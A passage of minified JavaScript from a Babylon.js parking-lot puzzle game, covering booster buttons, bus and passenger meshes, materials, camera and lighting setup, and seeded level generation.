new BABYLON.GUI.Rectangle("pnlBooster");e.transformCenterX=.5;e.transformCenterY=.5;e.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;e.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;e.isPointerBlocker=!1;e.isHitTestVisible=!1;e.leftInPixels=0;e.topInPixels=0;e.thickness=0;e.color="yellow";e.widthInPixels=this.itemWidth;e.heightInPixels=this.itemWidth;e.highlightLineWidth=0;e.clipChildren=!1;e.clipContent=!1;e.isVisible=!0;e.booster=b;this.addControl(e);var f=new BABYLON.GUI.Image("imgBoosterBg");
f.transformCenterX=.5;f.transformCenterY=.5;f.isPointerBlocker=!1;f.isHitTestVisible=!1;f.leftInPixels=0;f.topInPixels=0;f.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;f.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;SetImageFromSpritesheet(f,getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_top_blue.png");e.addControl(f);f=BABYLON.GUI.Button.CreateImageOnlyButton("imgBoosterBtn");f.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;
f.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;f.booster=b;f.topInPixels=-15;e.addControl(f);SetImageFromSpritesheet(f.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_"+b+"_btn.png");ResetGuiButtonAppearance(f,f.children[0].sourceWidth,f.children[0].sourceHeight);e.imgBoosterBtn=f;f.onPointerClickObservable.add(ScreenGame.instance.onBoosterPressed.bind(ScreenGame.instance));this.pnlSlots.push(e);this.arrangeSlots()};this.pnlBoosters.arrangeSlots=function(b,e){b=
(-(this.pnlSlots.length*this.itemWidth)+this.itemWidth)/2;this.widthInPixels=750;this.heightInPixels=140;for(e=0;e<this.pnlSlots.length;e++)this.pnlSlots[e].leftInPixels=b,this.pnlSlots[e].topInPixels=.2*-this.itemWidth,b+=this.itemWidth};this.pnlBoosters.addBooster("shuffle");this.pnlBoosters.addBooster("sort");return this.pnlBoosters},onBoosterPressed:function(a,b){Buttons.enabled&&(a=b.currentTarget.booster,this._canBoosterBeRun(a,b.currentTarget)?this.purchaseBooster(a):(ScreenGame.instance.negativeShakeAnimation(b.currentTarget,
DURATION_BOOSTER_SHAKE),soundManager.playSound("negative_buy"),"sort"==a&&(b=this.pnlBoosters.getBoosterByName(a).transformedMeasure,screenParticles.textParticles.CreateTextParticle1(0,b.top-engineRenderHeight/2,STR("NO_CAR_TO_SORT"),45,"#FFFFFF",1))))},purchaseBooster:function(a){activeScene.gamePaused=!0;screenGame.disableControls();screenPurchaseBooster.setBooster(a);screenPurchaseBooster.setPrice(BoosterPrices[a]);screenPurchaseBooster.showScene()},purchaseSpot:function(a){null!=a.icon&&a.icon.isVisible&&
(activeScene.gamePaused=!0,soundManager.playSound("button"),screenGame.disableControls(),screenPurchaseSpot.spot=a,screenPurchaseSpot.showScene())},newSpotPurchased:function(){for(var a=0;a<this.parkingSpots.length;a++)if(null!=this.parkingSpots[a].icon&&this.parkingSpots[a].icon.isVisible){this.spotPurchased(this.parkingSpots[a]);break}},getSpotForPurchase:function(){for(var a=0;a<this.parkingSpots.length;a++)if(null!=this.parkingSpots[a].icon&&this.parkingSpots[a].icon.isVisible)return this.parkingSpots[a];
return null},spotPurchased:function(a){a.icon.isVisible=!1;null!=a.price&&(a.price.isVisible=!1)},runBooster:function(a){return"sort"==a?this.onBoosterPressed_sort():"shuffle"==a?this.onBoosterPressed_shuffle():"turbo"==a?(this.resetGame(),PlayerCash=1E4,Buttons.enabled=!0):!1},_canBoosterBeRun:function(a,b){if("sort"==a){if(0<this.peopleToGetIn.length)return!1;for(b=a=0;b<this.parkingSpots.length;b++)null!=this.parkingSpots[b].parkedBus&&a++;return 0<a}return"shuffle"==a?!0:!1},onBoosterPressed_sort:function(){Buttons.enabled=
!1;soundManager.playSound("completed_3");screenGame.sortPeopleColors(function(){Buttons.enabled=!0});return!0},sortPeopleColors:function(a){for(;0<this.peopleInQueue.length;){var b=this.peopleInQueue[this.peopleInQueue.length-1];b.isVisible=!1;this.preparedQueue.unshift(b.color);this.peopleInQueue.splice(this.peopleInQueue.length-1,1)}b=[];b.blue=0;b.green=0;b.orange=0;b.pink=0;b.purple=0;b.red=0;b.teal=0;for(var e=b.yellow=0;e<this.parkingSpots.length;e++)null!=this.parkingSpots[e].parkedBus&&(b[this.parkingSpots[e].parkedBus.busData.color]+=
this.parkingSpots[e].parkedBus.freeCapacity);var f=Object.keys(b);for(e=0;e<f.length;e++)0<b[f[e]]&&this.putColorAtTheBeginingOfQueue(f[e],b[f[e]]);this.populatePeopleInQueue();a()},putColorAtTheBeginingOfQueue:function(a,b){for(var e=0,f=0;f<this.preparedQueue.length&&e<b;f++)this.preparedQueue[f]==a&&(this.preparedQueue.splice(f,1),e++,f--);for(f=0;f<e;f++)this.preparedQueue.unshift(a)},onBoosterPressed_shuffle:function(){Buttons.enabled=!1;for(var a=0,b=0;4>b;b++)setTimeout(function(e){var f=function(){},
h="count321";3==e&&(f=function(){Buttons.enabled=!0},h="count0");soundManager.playSound(h);screenGame.shuffleBusesColors(f)}.bind(this),a,b),a+=180;return!0},shuffleBusesColors:function(a){var b=[];b[4]=[];b[6]=[];b[10]=[];for(var e=0;e<this.buses.length;e++){var f=this.buses[e];null==f.parkingSpot&&0!=f.freeCapacity&&b[f.capacity].push(f)}shufleBusesColorsInArray=function(h){for(shuffleArray(h);2<h.length;){var m=h[0],k=h[1],n=m.busData.color;screenGame.setBusColor(m,k.busData.color);screenGame.setBusColor(k,
n);h.splice(0,2)}};shufleBusesColorsInArray(b[4]);shufleBusesColorsInArray(b[6]);shufleBusesColorsInArray(b[10]);a()},_itemIncluded:function(a,b){for(var e in a)if(e==b)return!0;return!1},getObjectsOfType:function(a){for(var b=[],e=0;e<this.cubes.length;e++)this.cubes[e].model==a&&b.push(this.cubes[e])},getObjectsOfTypeCount:function(a){for(var b=0,e=0;e<this.cubes.length;e++)this.cubes[e].model==a&&b++;return b},negativeShakeAnimation:function(a,b){CommonAnimations.AnimateObjectProperty(a,"rotation",
1.25,b,null,1,!1,null,[[0,0],[.12,-DegToRad(10)],[.35,DegToRad(10)],[.55,-DegToRad(10)],[.75,DegToRad(10)],[1,0]])},throwLastObjectFromFactoryBelt:function(a){void 0===a&&(a=function(){});var b=this.factoryBeltLIFO[this.factoryBeltLIFO.length-1];this.removeItemFromFactoryBeltLIFO(b);b=this.getLastSlotIdxOfItem(b);return this.throwObjectFromFactoryBelt(b,a)?!0:!1},createOverlay:function(a){this.pnlOverlay=new BABYLON.GUI.Rectangle("pnlOverlay");this.pnlOverlay.transformCenterX=.5;this.pnlOverlay.transformCenterY=
.5;this.pnlOverlay.isPointerBlocker=!1;this.pnlOverlay.isHitTestVisible=!1;this.pnlOverlay.leftInPixels=0;this.pnlOverlay.topInPixels=0;this.pnlOverlay.background="#33333388";this.pnlOverlay.widthInPixels=1024;this.pnlOverlay.heightInPixels=1024;this.pnlOverlay.thickness=0;this.pnlOverlay.isVisible=!1;this.pnlOverlay.highlightLineWidth=0;this.pnlOverlay.clipChildren=!1;this.pnlOverlay.clipContent=!1;a.addControl(this.pnlOverlay);this.pnlOverlay.resize=function(b,e){this.widthInPixels=b+2;this.heightInPixels=
e+2}},createMaterials:function(){this.materialSensor=new BABYLON.StandardMaterial("materialSensor",activeScene.scene);this.materialSensor.diffuseColor=new BABYLON.Color3(.3,.3,.3);this.materialSensor.alpha=.5;this.materialSensor.freeze();var a=new BABYLON.Color3.FromHexString("#8B91A4");this.materialGround=new BABYLON.StandardMaterial("materialGround",activeScene.scene);this.materialGround.emissiveColor=a;this.materialGround.disableLighting=!0;this.materialGround.alpha=1;this.materialGround.freeze();
this.materialPOI=new BABYLON.StandardMaterial("materialPOI",activeScene.scene);this.materialPOI.diffuseColor=new BABYLON.Color3(1,0,0);this.materialPOI.specularColor=new BABYLON.Color3(30/255,30/255,30/255);this.materialPOI.alpha=1;this.materialPOI.freeze();this.materialPOIGreen=new BABYLON.StandardMaterial("materialPOIGreen",activeScene.scene);this.materialPOIGreen.diffuseColor=new BABYLON.Color3(0,1,0);this.materialPOIGreen.specularColor=new BABYLON.Color3(30/255,30/255,30/255);this.materialPOIGreen.alpha=
1;this.materialPOIGreen.freeze();this.materialPOI_Queue=new BABYLON.StandardMaterial("materialPOI_Queue",activeScene.scene);this.materialPOI_Queue.diffuseColor=new BABYLON.Color3(0,1,1);this.materialPOI_Queue.specularColor=new BABYLON.Color3(0,1,1);this.materialPOI_Queue.alpha=1;this.materialPOI_Queue.freeze();this.materialTouch=new BABYLON.StandardMaterial("materialTouch",activeScene.scene);this.materialTouch.diffuseColor=new BABYLON.Color3(66/255,55/255,32/255);this.materialTouch.alpha=0;this.materialTouch.freeze();
this.busesMaterials=[];this.peopleMaterial=this.createPeopleMaterial();this.createBusMaterial("car_blue");this.createBusMaterial("car_green");this.createBusMaterial("car_orange");this.createBusMaterial("car_pink");this.createBusMaterial("car_purple");this.createBusMaterial("car_red");this.createBusMaterial("car_teal");this.createBusMaterial("car_yellow");this.createBusMaterial("van_blue");this.createBusMaterial("van_green");this.createBusMaterial("van_orange");this.createBusMaterial("van_pink");this.createBusMaterial("van_purple");
this.createBusMaterial("van_red");this.createBusMaterial("van_teal");this.createBusMaterial("van_yellow");this.createBusMaterial("bus_blue");this.createBusMaterial("bus_green");this.createBusMaterial("bus_orange");this.createBusMaterial("bus_pink");this.createBusMaterial("bus_purple");this.createBusMaterial("bus_red");this.createBusMaterial("bus_teal");this.createBusMaterial("bus_yellow");this.explosionMaterial=new BABYLON.StandardMaterial("expl");this.explosionMaterial.diffuseTexture=AssetLoader.instance.loadedTextures["expl.png"];
this.explosionMaterial.diffuseTexture.hasAlpha=!0;this.explosionMaterial.diffuseTexture.invertY=!0;this.explosionMaterial.useAlphaFromDiffuseTexture=!0;this.explosionMaterial.emissiveColor=new BABYLON.Color3(1,1,1);this.explosionMaterial.transparencyMode=3;this.digitsMaterial=new BABYLON.StandardMaterial("digitsMaterial");this.digitsMaterial.diffuseTexture=AssetLoader.instance.loadedTextures["digits.png"];this.digitsMaterial.diffuseTexture.hasAlpha=!0;this.digitsMaterial.diffuseTexture.invertY=!0;
this.digitsMaterial.useAlphaFromDiffuseTexture=!0;this.digitsMaterial.emissiveColor=new BABYLON.Color3(1,1,1);this.digitsMaterial.transparencyMode=3},createBusMaterial:function(a){var b=new BABYLON.StandardMaterial("mat_bus_"+a);b.name="mat_bus_"+a;b.emissiveTexture=AssetLoader.instance.loadedTextures[a+".png"];b.emissiveTexture.hasAlpha=!0;b.emissiveTexture.vScale=-1;b.alpha=1;b.disableLighting=!0;this.busesMaterials[a]=b},createPeopleMaterial:function(){var a=new BABYLON.StandardMaterial("mat_people");
a.diffuseTexture=AssetLoader.instance.loadedTextures["people.png"];a.diffuseTexture.hasAlpha=!0;a.diffuseTexture.invertY=!0;a.useAlphaFromDiffuseTexture=!0;a.emissiveColor=new BABYLON.Color3(1,1,1);a.transparencyMode=3;return a},createCamera:function(){this.cameraPlayer=new BABYLON.FreeCamera("cameraPlayer",new BABYLON.Vector3(0,7,0),this.scene);this.cameraPlayer.rotation=new BABYLON.Vector3(DegToRad(65),DegToRad(135),0);this.cameraPlayer.mode=BABYLON.Camera.ORTHOGRAPHIC_CAMERA;this.cameraPlayer.orthoTop=
1;this.cameraPlayer.orthoBottom=-1;this.cameraPlayer.orthoLeft=-3;this.cameraPlayer.orthoRight=3;this.cameraPlayer.parent=this.rootNode;this.cameraPlayer.minZ=-100;this.cameraPlayer.maxZ=100;this.cameraPlayer.layerMask=LAYER_SCREEN_GAME;Object.defineProperty(this.cameraPlayer,"_setTarget",{get:function(){return this.target},set:function(a){this.setTarget(a);this.getViewMatrix(!0)}});this.cameraPlayer.fov=1.7;this.cameraPlayer.detachControl();GameData.BuildDebug&&(this.cameraDebug=new BABYLON.UniversalCamera("cameraDebug",
new BABYLON.Vector3(0,0,0),this.scene),this.cameraDebug.parent=this.rootNode,this.cameraDebug.minZ=.1,this.cameraDebug.rotation=new BABYLON.Vector3(DegToRad(140),DegToRad(180),0),this.cameraDebug.layerMask=LAYER_SCREEN_GAME,this.cameraDebug.inputs.addMouseWheel(),this.cameraDebug.inputs.attached.mousewheel.wheelPrecisionY=.1)},spawnModel:function(a,b,e,f,h,m){b=b.toLowerCase();var k=AssetLoader.instance.instantiateModel(b+".glb",LAYER_SCREEN_GAME);k.rootNodes[0].model=b;void 0===e&&(e=null);void 0===
f&&(f=null);void 0===h&&(h=null);void 0===m&&(m=null);null!==e&&(k.rootNodes[0].position=e.clone());null!==f&&(k.rootNodes[0].rotation=f.clone());null!==h&&(k.rootNodes[0].rotationQuaternion=h.clone());null!==m&&(k.rootNodes[0].scaling=m.clone());null!=a&&(k.rootNodes[0].parent=a);return k},initLevel:function(){this.highlightLayer=this.selectedObject=this.player=this.skybox=this.lightHemi=null;this.physicsViewer=new BABYLON.Debug.PhysicsViewer(activeScene.scene);this.createLight();this.createGroundPlane();
this.createHighlightLayer();this.createAnimatedPlanes();this.buses=[];this.busesNode=new BABYLON.TransformNode("buses");this.busesNode.setParent(this.rootNode);this.people=[];this.peopleNode=new BABYLON.TransformNode("people");this.peopleNode.setParent(this.rootNode)},createParticleSystem:function(){var a=new BABYLON.ParticleSystem("particles",100);a.renderingGroupId=1;a.particleTexture=AssetLoader.instance.loadedTextures["flare.png"];a.blendMode=BABYLON.BaseParticleSystem.BLENDMODE_ADD;a.emitter=
BABYLON.Vector3.Zero();a.color1=new BABYLON.Color4(226/255,42/255,20/255,1);a.color2=new BABYLON.Color4(1,132/255,.2,1);a.colorDead=new BABYLON.Color4(76/255,76/255,76/255,0);a.minSize=.1;a.maxSize=.3;a.minLifeTime=.5;a.maxLifeTime=1;a.emitRate=70;a.particleEmitterType=new BABYLON.CylinderDirectedParticleEmitter(.05,.05,.05,new BABYLON.Vector3(1,0,0),new BABYLON.Vector3(1,0,0));a.minEmitPower=1;a.maxEmitPower=2;a.updateSpeed=.03;a.savedAnimate=a.animate.bind(a);return a},resetPeople:function(){this.preparedQueue=
[];this.peopleInQueue=[];for(this.peopleToGetIn=[];0<this.people.length;)this.removeMan3d(this.people[0]);for(var a=0;70>a;a++){var b=this.createMan3D("blue");b.isVisible=!1;this.people.push(b)}this.generateWaitingQueue();this.populatePeopleInQueue();this.setQueuePanelNumber(this.peopleInQueue.length+this.preparedQueue.length)},populatePeopleInQueue:function(){for(var a=0;40>a&&this.addOneUnusedManToTheEndOfTheQueue();a++);},addOneUnusedManToTheEndOfTheQueue:function(){var a=this.getFirstUnusedMan();
return null!=a&&this.putManToTheEndOfTheQueue(a)?a:null},getFirstUnusedMan:function(){for(var a=0;a<this.people.length;a++)if(!this.people[a].isVisible)return this.people[a];return null},putManToTheEndOfTheQueue:function(a){var b=this.levelQueueStop.position.clone(),e=0;if(0==this.preparedQueue.length)return!1;this.resetMan(a);0<this.peopleInQueue.length&&(b=this.peopleInQueue[this.peopleInQueue.length-1].position.clone(),e=this.peopleInQueue[this.peopleInQueue.length-1].dspx);b.x-=STEP_PEOPLE_IN_QUEUE;
b.y=-2;b.z-=STEP_PEOPLE_IN_QUEUE;a.position=b;a.dspx=e;this.setManColor(a,this.preparedQueue[0]);this.preparedQueue.splice(0,1);this.peopleInQueue.push(a);return!0},unloadPeopleFromBus:function(a){for(;0<a.peopleOnboard.length;)a.peopleOnboard[0].isVisible=!1,a.peopleOnboard.splice(0,1)},removeMan3d:function(a){for(var b=0;b<this.people.length;b++)if(this.people[b]==a){this.people.splice(b,1);a.material.dispose();a.dispose();break}},createMan3D:function(a){var b=new BABYLON.Vector4(0,0,1,1);const e=
new BABYLON.Vector4(0,0,1,1);var f=MAN_SCALE;b=BABYLON.MeshBuilder.CreatePlane("man3d",{frontUVs:b,backUVs:e,sideOrientation:BABYLON.Mesh.DOUBLESIDE});b.scaling=v3(1*f,-1.7*f,1*f);b.position.y=1.3;b.billboardMode=BABYLON.Mesh.BILLBOARDMODE_ALL;b.layerMask=LAYER_SCREEN_GAME;b.material=this.peopleMaterial.clone();b.animFrame=getRandomUInt(4);b.animDelay=0;this.resetMan(b);this.setManColor(b,a);return b},resetMan:function(a){a.isVisible=!0;a.renderingGroupId=0;a.dspx=0;a.setParent(this.peopleNode);a.destination=
null},setManColor:function(a,b){a.color=b;this.updateManFrame(a)},updateManFrame:function(a,b,e){void 0===b&&(b=!1);void 0===e&&(e=!1);e?SetTextureFromSpritesheet(a.material.diffuseTexture,getAssetImageFrames("people"),"man_sitting_"+a.color+".png"):b?0<a.animDelay?a.animDelay-=activeScene.deltaTime:(a.animDelay=MAN_ANIM_DELAY,a.animFrame++,3<a.animFrame&&(a.animFrame=0),SetTextureFromSpritesheet(a.material.diffuseTexture,getAssetImageFrames("people"),"man_walk_"+a.color+"_0"+(a.animFrame+1)+".png")):
SetTextureFromSpritesheet(a.material.diffuseTexture,getAssetImageFrames("people"),"man_idle_"+a.color+".png")},shiftPeopleInQueueLeft:function(a){for(var b=0;b<this.peopleInQueue.length;b++)this.peopleInQueue[b].dspx+=STEP_PEOPLE_IN_QUEUE*a},createBus3d:function(a,b,e,f,h){void 0===e&&(e=v3(0,.2,0));var m=1,k=BABYLON.MeshBuilder.CreateBox("bus3d",{height:.5,width:1,depth:b});k.collided=!1;k.scaling=v3(m,m,m);k.position=e;k.isPickable=!0;k.layerMask=LAYER_SCREEN_GAME;k.size=b;k.testCollisions=!0;k.destination=
null;k.parkingSpot=null;k.parent=this.busesNode;k.computeWorldMatrix(!0);k.busTop=null;k.vanTop=null;k.carTop=null;void 0!==f&&(k.rotation=f);void 0!==h&&(k.rotationQuaternion=h);e=500<getRandomUIntWithSeed(1E3,this.levelSeed*this.buses.length);2==b&&(e?(e=this.spawnModel(k,"van").rootNodes[0],m=.0055,e.scaling=v3(m,m,m),m=traverseFindChildNodeByName(e._children[0],"van_body_top"),f=traverseFindChildNodeByName(e._children[0],"van_bottom"),e=traverseFindChildNodeByName(e._children[0],"_arrow"),m.isPickable=
!0,f.isPickable=!0,e.isPickable=!0,m.bus3d=k,f.bus3d=k,e.bus3d=k,k.isVisible=!1,k.vanTop=m,k.vanBottom=f,k.vanArrow=e,k.capacity=6,k.freeCapacity=6):(e=this.spawnModel(k,"car").rootNodes[0],m=.0055,e.scaling=v3(m,m,m),m=traverseFindChildNodeByName(e._children[0],"car_body_top"),f=traverseFindChildNodeByName(e._children[0],"car_bottom"),e=traverseFindChildNodeByName(e._children[0],"_arrow"),m.isPickable=!0,f.isPickable=!0,e.isPickable=!0,m.bus3d=k,f.bus3d=k,e.bus3d=k,k.isVisible=!1,k.carTop=m,k.carBottom=
f,k.carArrow=e,k.capacity=4,k.freeCapacity=4),k.peopleOnboard=[]);3==b&&(e=this.spawnModel(k,"bus").rootNodes[0],m=.0055,e.scaling=v3(m,m,m),b=traverseFindChildNodeByName(e._children[0],"bus_body_top"),m=traverseFindChildNodeByName(e._children[0],"bus_bottom"),e=traverseFindChildNodeByName(e._children[0],"_arrow"),b.isPickable=!0,m.isPickable=!0,e.isPickable=!0,b.bus3d=k,m.bus3d=k,e.bus3d=k,k.isVisible=!1,k.busTop=b,k.busBottom=m,k.busArrow=e,k.capacity=10,k.freeCapacity=10,k.peopleOnboard=[]);this.setBusColor(k,
a);k.queued=!1;k.isPickable=!0;SHADOWS_ENABLED&&this.shadowGenerator.addShadowCaster(k,!0);this.buses.push(k);return k},setBusColor:function(a,b){a.hasOwnProperty("busData")&&(a.busData.color=b);10==a.capacity&&(a.busTop.material=this.busesMaterials["bus_"+b],a.busBottom.material=this.busesMaterials["bus_"+b]);6==a.capacity&&(a.vanTop.material=this.busesMaterials["van_"+b],a.vanBottom.material=this.busesMaterials["van_"+b]);4==a.capacity&&(a.carTop.material=this.busesMaterials["car_"+b],a.carBottom.material=
this.busesMaterials["car_"+b])},openRoofBus3d:function(a){null!=a.busTop&&(a.busTop.isVisible=!1,a.busArrow.isVisible=!1);null!=a.carTop&&(a.carTop.isVisible=!1,a.carArrow.isVisible=!1);null!=a.vanTop&&(a.vanTop.isVisible=!1,a.vanArrow.isVisible=!1)},closeRoofBus3d:function(a){null!=a.busTop&&(a.busTop.isVisible=!0,a.busArrow.isVisible=!0);null!=a.carTop&&(a.carTop.isVisible=!0,a.carArrow.isVisible=!0);null!=a.vanTop&&(a.vanTop.isVisible=!0,a.vanArrow.isVisible=!0);this.unloadPeopleFromBus(a)},resetBuses:function(){this.departedBuses=
0;this.busesToMove=[];this.busesToPark=[];this.busesToGo=[];this.busToGoDelay=0;this.seatsOfColor=[];this.seatsOfColor.blue=0;this.seatsOfColor.green=0;this.seatsOfColor.orange=0;this.seatsOfColor.pink=0;this.seatsOfColor.purple=0;this.seatsOfColor.red=0;this.seatsOfColor.teal=0;for(this.seatsOfColor.yellow=0;0<this.buses.length;)this.removeBus3d(this.buses[0])},printGrid:function(a){for(var b=0;b<a.length;b++)for(var e=leadingZero(b,2)+" | ",f=0;f<a[b].length;f++)e+=null==a[b][f]?"  ":leadingZero(a[b][f].id,
2),e+=" | "},createLevel:function(a,b,e,f){this.onboardingActive=!1;this.onboardingBusId=0;this.levelSeed=Math.pow(100*ActiveLevel,2);this.gridSize=12;this.filterSize=8.5;this.colors="red green blue teal purple pink orange yellow".split(" ");var h=null;if(Levels.length>ActiveLevel){var m=Levels[ActiveLevel];m.hasOwnProperty("buses")&&(h=m.buses);m.hasOwnProperty("levelSeed")&&(this.levelSeed=m.levelSeed);m.hasOwnProperty("gridSize")&&(this.gridSize=m.gridSize);m.hasOwnProperty("filterSize")&&(this.filterSize=
m.filterSize);m.hasOwnProperty("colors")&&(this.colors=m.colors);m.hasOwnProperty("onboarding")&&(this.onboardingActive=m.onboarding)}void 0!==a&&(this.levelSeed=a);void 0!==b&&(this.gridSize=b);void 0!==e&&(this.filterSize=e);void 0!==f&&(this.colors=f);null==h&&(h=this.generateLevelBuses(this.levelSeed,this.gridSize,this.filterSize,this.colors));this.createBusesFromArray(h,this.levelSeed,[this.gridSize,this.gridSize]);this.filterBuses(-DegToRad(45),this.filterSize,this.filterSize);this.filterBuses(-DegToRad(45),
-this.filterSize,-this.filterSize);this.filterBuses(-DegToRad(135),-this.filterSize,this.filterSize);this.filterBuses(-DegToRad(135),this.filterSize-.5,-(this.filterSize-.5));screenGame.setLevelBorderSize(17,15)},selectWithHandBusById:function(a){for(var b=0;b<this.buses.length;b++){var e=this.buses[b];if(e.busData.id==a)return a=this.getObjectProjection2D(e.position),screenHand.imgHand.leftInPixels=a.x,screenHand.imgHand.topInPixels=a.y,!0}return!1},generateLevelBuses:function(a,b,e,f){var h=["left",
"up","down","right"],m=function(r){for(var y=[],z=r.position[0],L=r.position[1],Q=0;Q<r.size;Q++)"up"==r.direction?y.push([z-Q,L]):"down"==r.direction?y.push([z+Q,L]):"left"==r.direction?y.push([z,L-Q]):"right"==r.direction&&y.push([z,L+Q]);return y},k=function(r,y){var z=y.length;y=y[0].length;return 0<=r[0]&&r[0]<z&&0<=r[1]&&r[1]<y},n=function(r,y){for(var z=0;z<r.length;z++){var L=r[z];if(!k(L,y)||null!=y[L[0]][L[1]])return!1}return!0},v=function(r,y){var z=m(r);return n(z,y)?(z.forEach(function(L){y[L[0]][L[1]]=
r}),!0):!1},w=function(r,y,z,L){for(var Q=[],R=0;R<y;R++)"up"===z?Q.push([r[0]-R,r[1]]):"down"===z?Q.push([r[0]+R,r[1]]):"left"===z?Q.push([r[0],r[1]-R]):"right"===z&&Q.push([r[0],r[1]+R]);return Q.every(x=>k(x,L)&&null===L[x[0]][x[1]])};a=function(r,y,z){for(var L=[],Q=[],R=!0,x=0;x<r[0];x++)L[x]=Array(r[1]).fill(null);x=Math.floor(r[0]/2);for(var S=Math.floor(r[1]/2),U=[],T=0;T<r[0];T++)for(var V=0;V<r[1];V++){var K=U;K.push.call(K,{position:[T,V],distance:Math.abs(T-Math.floor(r[0]/2))+Math.abs(V-
Math.floor(r[1]/2))})}shuffleArrayWithSeed(U,y);for(var X of U){r=X.position;U=z;T=R?3:2;V=!1;for(var W of h)if(w(r,T,W,L)&&(K=U[Math.floor(getRandomUIntWithSeed(U.length,y+10*Q.length))],K={id:Q.length+1,position:r,size:T,direction:W,color:K},r[0]<=x&&"down"==K.direction&&(K.direction="up"),r[0]>x&&"up"==K.direction&&(K.direction="down"),r[1]<=S&&"right"==K.direction&&(K.direction="left"),r[1]>S&&"left"==K.direction&&(K.direction="right"),v(K,L))){Q.push(K);V=!0;R=!R;break}if(!V&&3===T){T=2;for(W of h)if(w(r,
T,W,L)&&(K=U[Math.floor(getRandomUIntWithSeed(U.length,y+12*Q.length))],K={id:Q.length+1,position:r,size:T,direction:W,color:K},r[0]<=x&&"down"==K.direction&&(K.direction="up"),r[0]>x&&"up"==K.direction&&(K.direction="down"),r[1]<=S&&"right"==K.direction&&(K.direction="left"),r[1]>S&&"left"==K.direction&&(K.direction="right"),v(K,L))){Q.push(K);R=!0;break}}}return{grid:L,buses:Q}}([b,b],a,f);b=a.buses;this.printGrid(a.grid);return b},createBusesFromArray:function(a,b,e){this.resetBuses();a.forEach(function(f){var h=
b*screenGame.buses.length,m=0,k=getRandomIntWithSeed(2,h),n=-f.position[1]+e[1]/2-1,v=-e[0]/2+f.position[0]+1,w=1.37*GRID_SIZE,r=getRandomUIntWithSeed(10,h+2)/45;h=getRandomUIntWithSeed(10,h+5)/45;0==b&&(h=r=k=0);n=v3(n*w+r,.8,v*w+h);"left"==f.direction&&(m=-90,n.x+=(f.size/2-.5)*w);"right"==f.direction&&(m=90,n.x-=(f.size/2-.5)*w);"up"==f.direction&&(n.z+=(.5-f.size/2)*w);"down"==f.direction&&(m=180,n.z-=(.5-f.size/2)*w);screenGame.createBus3d(f.color,f.size,n,v3(0,DegToRad(m+k),0)).busData=f})},
filterBuses:function(a,b,e){var f=[];this.groundFilter.rotation.y=a;this.groundFilter.position.x=b;this.groundFilter.position.z=e;this.groundFilter.computeWorldMatrix(!0);for(a=0;a<this.buses.length;a++)this.buses[a].intersectsMesh(this.groundFilter,!0)&&f.push(this.buses[a]);for(;0<f.length;)this.removeBus3d(f[0]),f.splice(0,1)},createNewLevel:function(){},saveGameProgress:function(){var a={};a.score=screenTopPanel.playerScore;a.cubes=[];for(var b=0;b<this.cubes.length;b++){var e=this.cubes[b];a.cubes.push({number:e.number,
position:{x:e.position.x,y:e.position.y,z:e.position.z},rotation:{x:e.rotation.x,y:e.rotation.y,z:e.rotation.z},rotationQuaternion:{x:e.rotationQuaternion.x,y:e.rotationQuaternion.y,z:e.rotationQuaternion.z,w:e.rotationQuaternion.w},isPlayerCube:e.isPlayerCube,isRainbow:null!=e.rainbow3d,isBomb:null!=e.bomb3d})}SavedGame=a;GameData.Save()},loadGameProgress:function(){if(null==SavedGame)return!1;var a=SavedGame;screenTopPanel.playerScore=a.score;screenTopPanel.updateData();for(var b=0;b<a.cubes.length;b++){var e=
a.cubes[b],f=this.createCube3d(e.number,v3(e.position.x,e.position.y,e.position.z),v3(e.rotation.x,e.rotation.y,e.rotation.z),new BABYLON.Quaternion(e.rotationQuaternion.x,e.rotationQuaternion.y,e.rotationQuaternion.z,e.rotationQuaternion.w));f.isPlayerCube=e.isPlayerCube;f.isPlayerCube&&(this.playerCube=f)}return!0},removeBus3d:function(a){this.unloadPeopleFromBus(a);this.removeBusToMove(a);this.removeBusToPark(a);this.removeBusToGo(a);for(var b=0;b<this.buses.length;b++)if(this.buses[b]==a){this.buses.splice(b,
1);a.dispose();break}},createLight:function(){this.lightHemi=new BABYLON.HemisphericLight("lightHemi",new BABYLON.Vector3(-.01,-1,0),this.scene);this.lightHemi.intensity=1.5;this.lightHemi.diffuse=new BABYLON.Color3(1,1,1);this.lightHemi.specular=new BABYLON.Color3(0,1,0);this.lightHemi.groundColor=new BABYLON.Color3(.5,.5,.5);this.lightHemi.parent=this.rootNode;this.lightHemi.includeOnlyWithLayerMask=LAYER_SCREEN_GAME;this.lightDirect1=new BABYLON.DirectionalLight("lightDirect1",v3(.818,-.575,-0),
this.scene);this.lightDirect1.position=v3(-32,18.5,11);this.lightDirect1.intensity=2;this.lightDirect1.parent=this.rootNode;this.lightDirect1.diffuse=new BABYLON.Color3(1,.99,.87);this.lightDirect1.includeOnlyWithLayerMask=LAYER_SCREEN_GAME;SHADOWS_ENABLED&&(this.shadowGenerator=new BABYLON.ShadowGenerator(SHADOW_RES,this.lightDirect1),this.shadowGenerator.usePoissonSampling=!0)},createGroundPlane:function(){var a=GRID_SIZE*GRID_WIDTH*1.5,b=GRID_SIZE,e=GRID_SIZE*GRID_HEIGHT*1.5;this.boardNode=new BABYLON.TransformNode("board");
this.boardNode.setParent(this.rootNode);this.groundBase=BABYLON.MeshBuilder.CreateBox("groundBase",{width:a,height:b,depth:e},this.scene);this.groundBase.isVisible=collidersVisible;this.groundBase.material=this.materialGround;this.groundBase.setParent(this.boardNode);this.groundBase.position.x=0;this.groundBase.position.y=0;this.groundBase.isPickable=!1;this.groundBase.layerMask=LAYER_SCREEN_GAME;this.groundModel=this.spawnModel(this.boardNode,"parking_field",v3(11,.7,-10),v3(0,-DegToRad(45),0),null,
